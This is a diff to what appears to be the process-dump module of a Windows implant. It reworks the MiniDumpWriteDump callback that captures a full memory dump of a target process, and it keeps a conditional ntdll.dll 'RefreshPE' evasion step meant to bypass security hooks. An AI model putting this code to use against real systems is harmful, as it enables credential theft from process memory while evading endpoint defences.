@@ -20,6 +20,7 @@ package procdump
 
 import (
 	"fmt"
+	"runtime"
 
 	//{{if .Config.Debug}}
 	"log"
@@ -67,19 +68,36 @@ const (
 	S_OK                   = 0
 	TRUE                   = 1
 	FALSE                  = 0
-	IncrementSize          = 20 * 1024 * 1024 // Add 20MB just to be safe
 	MiniDumpWithFullMemory = 0x00000002
 )
-
-// var bytesRead uint32 = 0
 
 type WindowsDump struct {
 	data []byte
 }
 
 type outDump struct {
-	outPtr    uintptr
-	bytesRead uint32
+	chunks []dumpChunk
+}
+
+type dumpChunk struct {
+	data  []byte
+	start uint64
+}
+
+func (o *outDump) reassemble() []byte {
+	var lastChunk dumpChunk
+	// Find chunk that has the highest offset
+	for _, chunk := range o.chunks {
+		if chunk.start > lastChunk.start {
+			lastChunk = chunk
+		}
+	}
+	output := make([]byte, lastChunk.start+uint64(len(lastChunk.data)))
+	// Reassemble
+	for _, chunk := range o.chunks {
+		copy(output[chunk.start:], chunk.data)
+	}
+	return output
 }
 
 func (d *WindowsDump) Data() []byte {
@@ -116,11 +134,12 @@ func dumpProcess(pid int32) (ProcessDump, error) {
 }
 
 func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
+	var err error
 	dump := &WindowsDump{}
 	// {{if eq .Config.GOARCH "amd64"}}
 	// Hotfix for #66 - need to dig deeper
 	// {{if .Config.Evasion}}
-	err := evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
+	err = evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("RefreshPE failed:", err)
@@ -130,30 +149,8 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	// {{end}}
 	// {{end}}
 
-	heapHandle, err := syscalls.GetProcessHeap()
-	if err != nil {
-		return dump, err
-	}
-
-	procMemCounters := syscalls.ProcessMemoryCounters{}
-	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))
-	err = syscalls.GetProcessMemoryInfo(proc, &procMemCounters, sizeOfMemCounters)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("GetProcessMemoryInfo failed: %s\n", err)
-		// {{end}}
-		return dump, err
-	}
-
-	heapSize := procMemCounters.WorkingSetSize + IncrementSize
-
-	dumpBuffer, err := syscalls.HeapAlloc(heapHandle, 0x00000008, uintptr(heapSize))
-	if err != nil {
-		return dump, err
-	}
-
 	outData := outDump{
-		outPtr: dumpBuffer,
+		chunks: make([]dumpChunk, 0),
 	}
 
 	callbackInfo := MiniDumpCallbackInformation{
@@ -174,17 +171,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	if err != nil {
 		return dump, err
 	}
-	outBuff := make([]byte, outData.bytesRead)
-	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))
-	syscalls.RtlCopyMemory(outBuffAddr, outData.outPtr, outData.bytesRead)
-	err = syscalls.HeapFree(heapHandle, 0, outData.outPtr)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("HeapFree failed: \n", err)
-		// {{end}}
-		return dump, err
-	}
-	dump.data = outBuff
+	dump.data = outData.reassemble()
 	return dump, nil
 }
 
@@ -215,9 +202,7 @@ func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) 
 	callbackInput := MiniDumpCallbackInput{}
 	ioCallback := MiniDumpIOCallback{}
 	bufferSize := unsafe.Sizeof(callbackInput)
-	data := make([]byte, bufferSize)
-	dataPtr := uintptr(unsafe.Pointer(&data[0]))
-	syscalls.RtlCopyMemory(dataPtr, callbackInputPtr, uint32(bufferSize))
+	data := unsafe.Slice((*byte)(unsafe.Pointer(callbackInputPtr)), int(bufferSize))
 	buffReader := bytes.NewReader(data)
 	err := binary.Read(buffReader, binary.LittleEndian, &callbackInput.ProcessId)
 	if err != nil {
@@ -274,9 +259,16 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 	case IoWriteAllCallback:
 		callbackOutput.Status = S_OK
 		outData := (*outDump)(unsafe.Pointer(callbackParam))
-		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
-		syscalls.RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
-		outData.bytesRead += callbackInput.Io.BufferBytes
+		liveSliceSize := int(callbackInput.Io.BufferBytes)
+		liveSlice := unsafe.Slice((*byte)(unsafe.Pointer(callbackInput.Io.Buffer)), liveSliceSize)
+		// deep copy
+		newChunk := dumpChunk{
+			data:  make([]byte, liveSliceSize),
+			start: callbackInput.Io.Offset,
+		}
+		copy(newChunk.data, liveSlice)
+		outData.chunks = append(outData.chunks, newChunk)
+		runtime.KeepAlive(outData)
 	case IoFinishCallback:
 		callbackOutput.Status = S_OK
 	default:
